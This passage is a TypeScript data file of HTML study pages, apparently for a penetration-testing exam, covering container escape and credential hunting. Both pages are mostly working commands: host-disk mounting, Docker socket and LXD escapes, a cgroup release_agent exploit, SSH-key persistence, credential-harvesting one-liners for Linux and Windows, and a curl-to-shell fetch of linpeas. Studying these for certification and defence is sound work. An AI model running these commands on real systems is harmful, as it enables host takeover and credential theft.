    summary: "Privileged container escapes via cgroup release_agent, LXD image import trick, Docker socket mounts, cap_sys_admin abuse, and host filesystem access.",
    toc: [
      { anchor: "detection", label: "Detecting Container Context" },
      { anchor: "privileged", label: "Privileged Container Escape" },
      { anchor: "docker-socket", label: "Docker Socket Escape" },
      { anchor: "lxd", label: "LXD Group Escape" },
      { anchor: "cgroup", label: "cgroup release_agent" },
      { anchor: "tips", label: "Exam Tips" },
    ],
    content: `
<h2 id="detection">Detecting Container Context</h2>
<pre><code># Check if you're in a container
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv  # exists in Docker containers
cat /run/.containerenv  # exists in Podman containers

# Check capabilities (high caps = privileged container)
capsh --print
# Look for: cap_sys_admin, cap_sys_ptrace, cap_net_admin

# Check mount points for host filesystem
findmnt | grep /host</code></pre>

<h2 id="privileged">Privileged Container Escape</h2>
<pre><code># If --privileged flag was used, you can mount host filesystem
# Check: ls /.dockerenv && cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = full capabilities (privileged)

# Mount host root filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host  # or /dev/xvda1, /dev/nvme0n1p1

# Read host files (SSH keys, /etc/shadow)
cat /mnt/host/etc/shadow
cat /mnt/host/root/.ssh/id_rsa

# Write to host — add SSH key for persistence
echo 'ssh-rsa AAAA...' >> /mnt/host/root/.ssh/authorized_keys

# Chroot into host filesystem for full shell
chroot /mnt/host</code></pre>

<h2 id="docker-socket">Docker Socket Escape</h2>
<pre><code># Check for Docker socket mount
ls -la /var/run/docker.sock

# If accessible from inside container, spawn privileged container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Without docker binary — use curl against socket
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
# Start a new privileged container via API:
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \\
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'</code></pre>

<h2 id="lxd">LXD Group Escape</h2>
<pre><code># Check if current user is in lxd group
id | grep lxd

# If yes — import a minimal Alpine image and mount host
# On Kali: build LXD image
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder && sudo bash build-alpine
# Transfers: alpine-v3.x-x86_64.tar.gz

# On target:
lxc image import alpine-v3.x-x86_64.tar.gz --alias pwn
lxc init pwn privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# Now at /mnt/root — full host filesystem access
cat /mnt/root/etc/shadow</code></pre>

<h2 id="cgroup">cgroup release_agent (No Privileged Flag)</h2>
<pre><code># Works even without --privileged if CAP_SYS_ADMIN is available
# Or if running as root inside non-privileged container with cgroup v1

mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output  # host's /etc/shadow</code></pre>

<h2 id="tips">Exam Tips</h2>
<ul>
<li>Always check <code>id</code> for <code>docker</code> or <code>lxd</code> group membership — common privesc on CTF/exam hosts</li>
<li>Docker socket escape is the most reliable — if you see <code>/var/run/docker.sock</code> writable, you have root</li>
<li>LXD attack requires network access or file transfer to upload the Alpine image</li>
<li>Check <code>env | grep -i docker</code> for <code>DOCKER_HOST</code> pointing to a remote socket</li>
<li>Scan for container misconfigs with <code>deepce.sh</code> (automated Docker/container escape tool)</li>
</ul>`,
  },
  {
    slug: "credential-hunting",
    title: "Credential Hunting Scripts",
    category: "Tools & Setup",
    summary: "Automated one-liners and scripts for Linux and Windows credential discovery — config files, environment variables, command history, browsers, and credential managers.",
    toc: [
      { anchor: "linux", label: "Linux Credential Hunting" },
      { anchor: "windows", label: "Windows Credential Hunting" },
      { anchor: "databases", label: "Database Credential Discovery" },
      { anchor: "network", label: "Network Config Credentials" },
      { anchor: "automated", label: "Automated Tools" },
    ],
    content: `
<h2 id="linux">Linux Credential Hunting</h2>
<pre><code># History files — highest yield
cat ~/.bash_history ~/.zsh_history ~/.sh_history 2>/dev/null
find / -name ".*_history" 2>/dev/null | xargs cat

# SSH private keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | grep -v proc
cat ~/.ssh/id_rsa

# Config files with passwords (common patterns)
grep -riE "(password|passwd|pwd|secret|token|api_key)\\s*[=:]\\s*['\"]?\\w+" \\
  /etc /var/www /opt /home 2>/dev/null

# PHP config files (web apps)
find / -name "config.php" -o -name "wp-config.php" -o -name "settings.py" 2>/dev/null | \\
  xargs grep -l "password" 2>/dev/null | xargs grep -E "(DB_PASS|password|secret)"

# Environment variables (service accounts often have creds)
env | grep -iE "(pass|pwd|secret|token|key)"
cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i pass

# /etc/passwd / shadow
cat /etc/shadow 2>/dev/null
cat /etc/passwd | grep -v nologin | grep -v false

# Service account credentials
cat /etc/mysql/my.cnf /etc/mysql/debian.cnf 2>/dev/null
find /var/lib -name "*.conf" 2>/dev/null | xargs grep -l password

# Recent files accessed by root
find / -readable -newer /etc/passwd 2>/dev/null | head -20

# Cron jobs with credentials
crontab -l; cat /etc/crontab; ls /etc/cron.*/ 2>/dev/null</code></pre>

<h2 id="windows">Windows Credential Hunting</h2>
<pre><code># Stored credentials
cmdkey /list
# Output shows stored Windows Credential Manager entries

# Registry — common password storage locations
reg query HKLM /f "password" /t REG_SZ /s 2>nul
reg query HKCU /f "password" /t REG_SZ /s 2>nul
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>nul

# Unattended install files
type C:\\Windows\\sysprep\\sysprep.xml 2>nul
type C:\\Windows\\Panther\\Unattend.xml 2>nul
type C:\\Windows\\system32\\sysprep\\unattend.xml 2>nul

# PowerShell history
type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt

# IIS web.config files
dir /s /b C:\\inetpub\\web.config 2>nul | findstr /i "password"

# Application config files
dir /s /b "C:\\*config*" 2>nul
findstr /si "password" C:\\Users\\*.xml C:\\Users\\*.txt C:\\Users\\*.ini 2>nul

# SAM / SYSTEM backup (VSS)
vssadmin list shadows 2>nul
# If shadows exist, copy SAM/SYSTEM from shadow copy

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear</code></pre>

<h2 id="databases">Database Credential Discovery</h2>
<pre><code># MySQL
cat /etc/mysql/my.cnf | grep -E "(user|pass)"
find / -name ".my.cnf" 2>/dev/null | xargs cat
mysql -u root --password="" -e "SELECT User,authentication_string FROM mysql.user;" 2>/dev/null

# PostgreSQL
find / -name "pg_hba.conf" -o -name "postgresql.conf" 2>/dev/null
cat ~/.pgpass 2>/dev/null

# MSSQL (Windows)
# Look in SQL Server config
type "C:\\Program Files\\Microsoft SQL Server\\MSSQL*\\MSSQL\\Log\\ERRORLOG" | findstr pass</code></pre>

<h2 id="network">Network Config Credentials</h2>
<pre><code># VPN configs
find / -name "*.ovpn" -o -name "*.conf" -path "*/vpn/*" 2>/dev/null
cat /etc/openvpn/*.conf 2>/dev/null | grep -E "(auth|pass)"

# Network manager
cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -E "(psk|password)"

# SSH config (reveals hosts and potential key paths)
cat ~/.ssh/config 2>/dev/null
cat /etc/ssh/ssh_config 2>/dev/null</code></pre>

<h2 id="automated">Automated Tools</h2>
<pre><code># LinPEAS (Linux)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or upload and run: ./linpeas.sh | tee /tmp/linpeas.txt

# WinPEAS (Windows)
.\winPEASx64.exe | Tee-Object -FilePath C:\\Windows\\Temp\\peas.txt

# LaZagne — credential extraction tool (cross-platform)
./lazagne.py all
# Searches: browsers, databases, git, mail, maven, sysadmin tools

# Windows: LaZagne.exe
.\LaZagne.exe all > C:\\Windows\\Temp\\lazagne_out.txt

# Snaffler — network share credential hunting
.\Snaffler.exe -s -o snaffler.log
# Searches SYSVOL, shares for config files, credentials</code></pre>

<div class="tip-box">
<strong>CPTS Exam:</strong> Credential reuse is extremely common in the exam environment. Every credential you find should be immediately tested against all discovered services via password spray.
</div>`,
  },
];

export function getTopicBySlug(slug: string): ResearchTopic | undefined {
  return researchTopics.find(t => t.slug === slug);
}

export function getAdjacentTopics(slug: string): { prev?: ResearchTopic; next?: ResearchTopic } {
  const idx = researchTopics.findIndex(t => t.slug === slug);
  return {
    prev: idx > 0 ? researchTopics[idx - 1] : undefined,
    next: idx < researchTopics.length - 1 ? researchTopics[idx + 1] : undefined,
  };
}
